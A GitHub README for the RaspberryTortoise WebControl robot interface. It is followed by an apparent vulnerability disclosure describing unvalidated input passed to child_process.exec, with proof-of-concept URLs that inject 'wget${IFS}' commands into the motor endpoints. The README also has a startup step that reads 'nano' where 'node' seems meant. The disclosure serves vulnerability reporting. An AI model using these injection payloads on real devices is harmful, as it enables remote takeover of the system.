## [README.md](#readme)

# RaspberryTortoise WebControl

node.js is used to provide the web interface for the control of the raspberryTortoise.

## Installation

```
sudo apt-get nodejs git
cd ~
git clone https://github.com/raspberrytorte/tortoise.git

```

## Run Manually

```
sudo node ~/tortoise/nodejs/raspberryTortoise.js ServerIP ServerPort drivePath

```

where:

serverIP : default 192.168.0.10, is the address of the webserver, this should be the same address used by the server in motion.

serverPort : default 8080, is the port of the webserver.

drivePath : default "../drive" , the path to the folder containing the motor drive code. If you use a relative path it should be routed from the directory where you manually call node. If you run node automatically, use the full path.

## Run at Startup

to run the server automatically when you power up the RPi

```
sudo nano /etc/rc.local

```

add the line

```
nano <pathToTortoise>/nodejs/raspberryTortoise.js ServerIP ServerPort drivePath

```

## Security Note

In order to execute motor drive commands the node needs to run with SUDO privilges.

This is very nasty and has security implications.

Be very careful if you deploy this on an RPi that is web connected.

## Webserver

Using your browser navigate to <http://ServerIP:ServerPort>

example:

```
http://192.168.0.10:8080

```

|  | Suggeted description |
| --- | --- |
|  | The WebControl in |
|  | RaspberryTortoise through 2012-10-28 is vulnerable to remote code execution via shell metacharacters in a URI. |
|  | The file nodejs/raspberryTortoise.js has no validation on the |
|  | parameter incomingString before passing it to the child\_process.exec |
|  | function. |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Additional Information] |
|  | Steps to Reproduce: |
|  |  |
|  | 1. Start the RaspberryTortoise Webcontrol as mentioned in https://github.com/raspberrytorte/tortoise/tree/master/nodejs |
|  | 2. Start your local server for example, `python3 -m http.server 80` |
|  | 3. Go to the below url |
|  | http://127.0.0.1:8080/backward?0.05;wget${IFS}127.0.0.1/abcd |
|  | 4. You should receive a request on your local webserver |
|  |  |
|  | All the below components are also vulnerable. |
|  |  |
|  | http://127.0.0.1:8080/forward?0.05;wget${IFS}127.0.0.1/abcd |
|  | http://127.0.0.1:8080/left?0.05;wget${IFS}127.0.0.1/abcd |
|  | http://127.0.0.1:8080/right?0.05;wget${IFS}127.0.0.1/abcd |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [VulnerabilityType Other] |
|  | Remote Code Execution |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Vendor of Product] |
|  | Raspberry Torte |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Affected Product Code Base] |
|  | RaspberryTortoise Webcontrol - latest |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Affected Component] |
|  | backward |
|  | left |
|  | right |
|  | forward |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Attack Type] |
|  | Remote |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Impact Code execution] |
|  | true |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Impact Information Disclosure] |
|  | true |
|  |  |
|  | ------------------------------------------ |
|  |  |
|  | [Attack Vectors] |
|  | An attacker can exploit this vulnerability by crafting payload in |
|  | http://tortoise-ip/backward?0.05 for example to obtain blind remote |
|  | code execution. Due to this flaw, it leads to complete compromise of |
|  | the system. |
